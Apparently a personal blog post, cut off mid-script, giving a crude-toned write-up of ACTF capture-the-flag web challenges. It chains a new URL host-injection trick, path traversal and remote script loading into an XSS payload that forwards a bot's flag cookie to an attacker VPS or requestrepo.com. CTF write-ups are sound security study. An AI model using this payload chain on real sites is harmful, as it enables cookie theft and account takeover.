<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>ACTF-复现 | 光辉的blog啦~~</title><meta name="author" content="1llustrious"><meta name="copyright" content="1llustrious"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="写在前面 easy latex  new URL 特性😂  运用到题目🤪   visit 触发   hooks  what is webhook🤔 Abusing Jenkins login 开打😤   ~Ave Mujica’s Masquerade~  源码，冲😓   story  源码🤔      写在前面 呜呜呜，shanhegiegie 太猛了，打了一天懒猫，第二天还要上">
<meta property="og:type" content="article">
<meta property="og:title" content="ACTF-复现">
<meta property="og:url" content="https://1llustrious.github.io/2023/12/02/ACTF-%E5%A4%8D%E7%8E%B0/index.html">
<meta property="og:site_name" content="光辉的blog啦~~">
<meta property="og:description" content="写在前面 easy latex  new URL 特性😂  运用到题目🤪   visit 触发   hooks  what is webhook🤔 Abusing Jenkins login 开打😤   ~Ave Mujica’s Masquerade~  源码，冲😓   story  源码🤔      写在前面 呜呜呜，shanhegiegie 太猛了，打了一天懒猫，第二天还要上">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://raw.githubusercontent.com/1llustrious/img/main/202311301720501.jpg">
<meta property="article:published_time" content="2023-12-02T00:12:41.000Z">
<meta property="article:modified_time" content="2023-12-02T11:42:25.754Z">
<meta property="article:author" content="1llustrious">
<meta property="article:tag" content="WP">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="复现">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://raw.githubusercontent.com/1llustrious/img/main/202311301720501.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://1llustrious.github.io/2023/12/02/ACTF-%E5%A4%8D%E7%8E%B0/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="//busuanzi.ibruce.info"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Error',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'ACTF-复现',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-12-02 19:42:25'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="光辉的blog啦~~" type="application/atom+xml">
<script>function loadCss(l){var d=document,h=d.head,s=d.createElement('link');s.rel='stylesheet';s.href=l;!function e(f){if (d.body)return f();setTimeout(function(){e(f)})}(function(){h.appendChild(s);});}loadCss('/style.css');loadCss('https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css');loadCss('https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css');loadCss('https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css');</script><noscript><link rel="stylesheet" href="/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css"></noscript></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://raw.githubusercontent.com/1llustrious/img/main/202312061631677.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">8</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">4</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><hr class="custom-hr"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://raw.githubusercontent.com/1llustrious/img/main/202311301720501.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="光辉的blog啦~~"><span class="site-name">光辉的blog啦~~</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">ACTF-复现</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2023-12-02T00:12:41.000Z" title="Created 2023-12-02 08:12:41">2023-12-02</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2023-12-02T11:42:25.754Z" title="Updated 2023-12-02 19:42:25">2023-12-02</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="ACTF-复现"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><div class="top-img" style="background-image: url('https://raw.githubusercontent.com/1llustrious/img/main/202311301720501.jpg');"></div><article class="post-content" id="article-container"><!-- toc -->
<ul>
<li><a href="#%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2">写在前面</a></li>
<li><a href="#easy-latex">easy latex</a>
<ul>
<li><a href="#new-url%E7%89%B9%E6%80%A7">new URL 特性😂</a>
<ul>
<li><a href="#%E8%BF%90%E7%94%A8%E5%88%B0%E9%A2%98%E7%9B%AE">运用到题目🤪</a></li>
</ul>
</li>
<li><a href="#visit%E8%A7%A6%E5%8F%91">visit 触发</a></li>
</ul>
</li>
<li><a href="#hooks">hooks</a>
<ul>
<li><a href="#what-is-webhook">what is webhook🤔</a></li>
<li><a href="#abusing-jenkins-login">Abusing Jenkins login</a></li>
<li><a href="#%E5%BC%80%E6%89%93">开打😤</a></li>
</ul>
</li>
<li><a href="#~ave-mujicas-masquerade~">~Ave Mujica’s Masquerade~</a>
<ul>
<li><a href="#%E6%BA%90%E7%A0%81%E5%86%B2">源码，冲😓</a></li>
</ul>
</li>
<li><a href="#story">story</a>
<ul>
<li><a href="#%E6%BA%90%E7%A0%81">源码🤔</a></li>
</ul>
</li>
</ul>
<!-- tocstop -->
<h1 id="写在前面"><span id="写在前面"> 写在前面</span></h1>
<p>呜呜呜，shanhegiegie 太猛了，打了一天懒猫，第二天还要上课，周六补课，是谁啊，原来是👴啊，那没事了 (nmsl).</p>
<p>参考:</p>
<p><a target="_blank" rel="noopener" href="https://wm-ctf-team.feishu.cn/docx/PLbbdhwdyoAefuxokXwcYppzn1c">https://wm-ctf-team.feishu.cn/docx/PLbbdhwdyoAefuxokXwcYppzn1c</a></p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/pzXApXq3LhZvZvc87qqMDw">微信公众平台 (qq.com)</a></p>
<h1 id="easy-latex"><span id="easy-latex"> easy latex</span></h1>
<h2 id="new-url-特性"><span id="new-url-特性"> new URL 特性😂</span></h2>
<p>先来个小 demo</p>
<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> username = <span class="string">"43.143.192.19:1145"</span></span><br><span class="line"><span class="keyword">const</span> vip_url = <span class="string">"http://vip:5000/"</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">new</span> <span class="title function_">URL</span>(username,vip_url))</span><br></pre></td></tr></tbody></table></figure>
<p><img src="/2023/12/02/ACTF-%E5%A4%8D%E7%8E%B0/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231030151912.png" alt="微信截图_20231030151912"></p>
<p>如此，pathname 是我们的第一个参数，host 是我们的第二个参数.</p>
<p>倘若我第一个参数前面加 \\ 或是 //, 阁下又当如何应对😓.</p>
<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> username = <span class="string">"\\\\43.143.192.19:1145"</span></span><br><span class="line"><span class="comment">//const username = "//43.143.192.19:1145"</span></span><br><span class="line"><span class="keyword">const</span> vip_url = <span class="string">"http://vip:5000/"</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">new</span> <span class="title function_">URL</span>(username,vip_url))</span><br></pre></td></tr></tbody></table></figure>
<p><img src="/2023/12/02/ACTF-%E5%A4%8D%E7%8E%B0/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231030152151.png" alt="微信截图_20231030152151"></p>
<p>喜欢我绕过污染 host 吗😛</p>
<h3 id="运用到题目"><span id="运用到题目"> 运用到题目🤪</span></h3>
<p>不多 bb, 源码鉴赏一波</p>
<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">'/preview'</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> {</span><br><span class="line">    <span class="keyword">let</span> { tex, theme } = req.<span class="property">query</span></span><br><span class="line">    <span class="keyword">if</span> (!tex) {</span><br><span class="line">        tex = <span class="string">'Today is \\today.'</span></span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">const</span> nonce = <span class="title function_">getNonce</span>(<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">let</span> base = <span class="string">'https://cdn.jsdelivr.net/npm/latex.js/dist/'</span></span><br><span class="line">    <span class="keyword">if</span> (theme) {</span><br><span class="line">        base = <span class="keyword">new</span> <span class="title function_">URL</span>(theme, <span class="string">`http://<span class="subst">${req.headers.host}</span>/theme/`</span>) + <span class="string">'/'</span></span><br><span class="line">    }</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">'preview.html'</span>, { tex, nonce, base })</span><br><span class="line">})</span><br></pre></td></tr></tbody></table></figure>
<p>我直接 theme 上放入我的 vps, 远程加载奥西给</p>
<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preview?tex=asd&amp;theme=<span class="comment">//43.143.192.19:1145</span></span><br></pre></td></tr></tbody></table></figure>
<p><img src="/2023/12/02/ACTF-%E5%A4%8D%E7%8E%B0/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231030173612.png" alt="微信截图_20231030173612"></p>
<p>经一格德拉米的测试😤,wcsndm, 就算啥路径都不加他都会访问 /js/base.js, 这很不自由🤔.</p>
<p>没关系，直接在 vps 起一个一模一样的 emoji,👴真是个天才.</p>
<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">alert</span>(<span class="string">'wcsndm'</span>);</span><br></pre></td></tr></tbody></table></figure>
<p>/var/www/html/base/base.js 放上这个代码，测试一波，让我狠狠地测！！！🥵</p>
<p><img src="/2023/12/02/ACTF-%E5%A4%8D%E7%8E%B0/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231030175131.png" alt="微信截图_20231030175131"></p>
<p>欧内的手，好汉，奥西给，爽的雅痞，比🐍出来还爽.</p>
<h2 id="visit-触发"><span id="visit-触发"> visit 触发</span></h2>
<p>不多 bb, 上源码</p>
<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">'/share/:id'</span>, reportLimiter, <span class="keyword">async</span> (req, res) =&gt; {</span><br><span class="line">    <span class="keyword">const</span> { id } = req.<span class="property">params</span></span><br><span class="line">    <span class="keyword">if</span> (!id) {</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">'no note id specified'</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">const</span> url = <span class="string">`http://localhost:<span class="subst">${PORT}</span>/note/<span class="subst">${id}</span>`</span></span><br><span class="line">    <span class="keyword">try</span> {</span><br><span class="line">        <span class="keyword">await</span> <span class="title function_">visit</span>(url)</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">'done'</span>)</span><br><span class="line">    } <span class="keyword">catch</span> (e) {</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(e)</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">'something error'</span>)</span><br><span class="line">    }</span><br><span class="line">})</span><br></pre></td></tr></tbody></table></figure>
<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">visit</span> = <span class="keyword">async</span> (<span class="params">url</span>) =&gt; {</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`start: <span class="subst">${url}</span>`</span>)</span><br><span class="line">    <span class="keyword">const</span> browser = <span class="keyword">await</span> puppeteer.<span class="title function_">launch</span>({</span><br><span class="line">        <span class="attr">headless</span>: <span class="string">'new'</span>,</span><br><span class="line">        <span class="attr">executablePath</span>: <span class="string">'/usr/bin/google-chrome-stable'</span>,</span><br><span class="line">        <span class="attr">args</span>: [<span class="string">'--no-sandbox'</span>],</span><br><span class="line">    })</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> ctx = <span class="keyword">await</span> browser.<span class="title function_">createIncognitoBrowserContext</span>();</span><br><span class="line">    <span class="keyword">try</span>{</span><br><span class="line">        <span class="keyword">const</span> page = <span class="keyword">await</span> ctx.<span class="title function_">newPage</span>();</span><br><span class="line">        <span class="keyword">await</span> page.<span class="title function_">setCookie</span>({</span><br><span class="line">            <span class="attr">name</span>: <span class="string">'flag'</span>,</span><br><span class="line">            <span class="attr">value</span>: <span class="variable constant_">FLAG</span>,</span><br><span class="line">            <span class="attr">domain</span>: <span class="string">`<span class="subst">${APP_HOST}</span>:<span class="subst">${APP_PORT}</span>`</span>,</span><br><span class="line">            <span class="attr">httpOnly</span>: <span class="literal">true</span></span><br><span class="line">        })</span><br><span class="line">        <span class="keyword">await</span> page.<span class="title function_">goto</span>(url, {<span class="attr">timeout</span>: <span class="number">5000</span>})</span><br><span class="line">        <span class="keyword">await</span> <span class="title function_">sleep</span>(<span class="number">3000</span>)</span><br><span class="line">        <span class="keyword">await</span> page.<span class="title function_">close</span>()</span><br><span class="line">    }<span class="keyword">catch</span>(e){</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(e);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">await</span> ctx.<span class="title function_">close</span>();</span><br><span class="line">    <span class="keyword">await</span> browser.<span class="title function_">close</span>()</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`done: <span class="subst">${url}</span>`</span>)</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>那么众所周知，visit 就是能够自行打开浏览器并且访问，不知道的话上网查，别问👴.</p>
<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">'/vip'</span>, auth, <span class="keyword">async</span> (req, res) =&gt; {</span><br><span class="line">    <span class="keyword">let</span> username = req.<span class="property">session</span>.<span class="property">username</span></span><br><span class="line">    <span class="keyword">let</span> { code } = req.<span class="property">body</span></span><br><span class="line">    <span class="keyword">let</span> vip_url = <span class="variable constant_">VIP_URL</span></span><br><span class="line">    <span class="keyword">let</span> data = <span class="keyword">await</span> (<span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="keyword">new</span> <span class="title function_">URL</span>(username, vip_url), {</span><br><span class="line">        <span class="attr">method</span>: <span class="string">'POST'</span>,</span><br><span class="line">        <span class="attr">headers</span>: {</span><br><span class="line">            <span class="title class_">Cookie</span>: <span class="title class_">Object</span>.<span class="title function_">entries</span>(req.<span class="property">cookies</span>).<span class="title function_">map</span>(<span class="function">(<span class="params">[k, v]</span>) =&gt;</span> <span class="string">`<span class="subst">${k}</span>=<span class="subst">${v}</span>`</span>).<span class="title function_">join</span>(<span class="string">'; '</span>)</span><br><span class="line">        },</span><br><span class="line">        <span class="attr">body</span>: <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>({ code })</span><br><span class="line">    })).<span class="title function_">text</span>()</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">'ok'</span> == data) {</span><br><span class="line">        res.<span class="title function_">cookie</span>(<span class="string">'token'</span>, <span class="title function_">sign</span>({ username, <span class="attr">isVip</span>: <span class="literal">true</span> }))</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">'Congratulation! You are VIP now.'</span>)</span><br><span class="line">    } <span class="keyword">else</span> {</span><br><span class="line">        res.<span class="title function_">send</span>(data)</span><br><span class="line">    }</span><br><span class="line">})</span><br></pre></td></tr></tbody></table></figure>
<p>而这个 visit, 打开浏览器访问，🍪里面是携带着 flag, 所以👴要拿到这个🍪.</p>
<p>但是 flag 不一定能够传来，而 vip 路由能够强制让 Cookie 携带就很好✌</p>
<p>不过直接访问是拿不到的，怎么办捏，xss 过来！</p>
<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/share路由<span class="keyword">new</span> url访问-&gt;<span class="regexp">/preview路由进行new url xss-&gt;加载vps恶意js-&gt;以带🍪的身份访问/</span>login和/vip,触发vip的fetch访问-&gt;将🍪数据转到xss平台.</span><br></pre></td></tr></tbody></table></figure>
<p>使用 urlencode</p>
<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/share/%2e%2e%2f%<span class="number">70</span>%<span class="number">72</span>%<span class="number">65</span>%<span class="number">76</span>%<span class="number">69</span>%<span class="number">65</span>%<span class="number">77</span>%3f%<span class="number">74</span>%<span class="number">65</span>%<span class="number">78</span>%3d%<span class="number">61</span>%<span class="number">77</span>%<span class="number">64</span>%<span class="number">61</span>%<span class="number">64</span>%<span class="number">61</span>%<span class="number">77</span>%<span class="number">64</span>%<span class="number">26</span>%<span class="number">74</span>%<span class="number">68</span>%<span class="number">65</span>%6d%<span class="number">65</span>%3d%2f%2f%<span class="number">34</span>%<span class="number">33</span>%2e%<span class="number">31</span>%<span class="number">34</span>%<span class="number">33</span>%2e%<span class="number">31</span>%<span class="number">39</span>%<span class="number">32</span>%2e%<span class="number">31</span>%<span class="number">39</span>%3a%<span class="number">31</span>%<span class="number">31</span>%<span class="number">34</span>%<span class="number">35</span></span><br><span class="line">/share/../preview?tex=awdadawd&amp;theme=<span class="comment">//43.143.192.19:1145</span></span><br></pre></td></tr></tbody></table></figure>
<p>目录穿越大法访问 preview, 至于为啥用 url 编码，因为是接在路径之后的，容易被解析成路径而不是传递的参数.</p>
<p>js 上放丶东西</p>
<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> login = <span class="string">'/login'</span>;</span><br><span class="line"><span class="keyword">const</span> vip = <span class="string">'/vip'</span>;</span><br><span class="line"><span class="keyword">const</span> loginreq = <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>({</span><br><span class="line">    <span class="attr">username</span>: <span class="string">'//z08vedyv.requestrepo.com'</span>,</span><br><span class="line">    <span class="attr">password</span>: <span class="string">'7bbf4ac9596b5662b44db993bd8050dd'</span>,</span><br><span class="line">});</span><br><span class="line"><span class="keyword">const</span> changshu = {</span><br><span class="line">    <span class="attr">method</span>: <span class="string">'POST'</span>,</span><br><span class="line">    <span class="attr">headers</span>: {</span><br><span class="line">        <span class="string">'Content-Type'</span>: <span class="string">'application/x-www-form-urlencoded'</span>,</span><br><span class="line">    },</span><br><span class="line">    <span class="attr">body</span>: loginreq,</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">evil</span>(<span class="params"></span>) {</span><br><span class="line">    <span class="keyword">try</span> {</span><br><span class="line">        <span class="keyword">const</span> loginrep = <span class="keyword">await</span> <span class="title function_">fetch</span>(login, changshu);</span><br><span class="line">        <span class="keyword">if</span> (loginrep.<span class="property">ok</span>) {</span><br><span class="line">            <span class="keyword">const</span> vipResponse = <span class="keyword">await</span> <span class="title function_">fetch</span>(vip, {</span><br><span class="line">                <span class="attr">method</span>: <span class="string">'POST'</span>,</span><br><span class="line">                <span class="attr">headers</span>: {</span><br><span class="line">                    <span class="string">'Content-Type'</span>: <span class="string">'application/x-www-form-urlencoded'</span>,</span><br><span class="line">                },</span><br><span class="line">                <span class="attr">body</span>: <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>({ <span class="attr">code</span>: <span class="string">"awdawdwadwadwadwa"</span> }),</span><br><span class="line">                <span class="attr">credentials</span>: <span class="string">'include'</span>,</span><br><span class="line">            });</span><br><span class="line">            <span class="comment">// 在这里你可以处理vipResponse</span></span><br><span class="line">        } <span class="keyword">else</span> {</span><br><span class="line">            <span class="comment">// 在这里处理登录失败的情况</span></span><br><span class="line">        }</span><br><span class="line">    } <span class="keyword">catch</span> (error) {</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(error);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="title function_">evil</span>();</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<p>👴爱使用<a target="_blank" rel="noopener" href="https://www.requestrepo.com/"> Dashboard - requestrepo.com</a> 收 cookies</p>
<p>cnm 不好用，还是 vps 得劲</p>
<p><img src="/2023/12/02/ACTF-%E5%A4%8D%E7%8E%B0/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231030181708.png" alt="微信截图_20231030181708"></p>
<p>eeeeeeeeeeeeeeez, もろいもろい。</p>
<p>最後の exp 改</p>
<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> login = <span class="string">'/login'</span>;</span><br><span class="line"><span class="keyword">const</span> vip = <span class="string">'/vip'</span>;</span><br><span class="line"><span class="keyword">const</span> loginreq = <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>({</span><br><span class="line">    <span class="attr">username</span>: <span class="string">'//43.143.192.19:7777'</span>,</span><br><span class="line">    <span class="attr">password</span>: <span 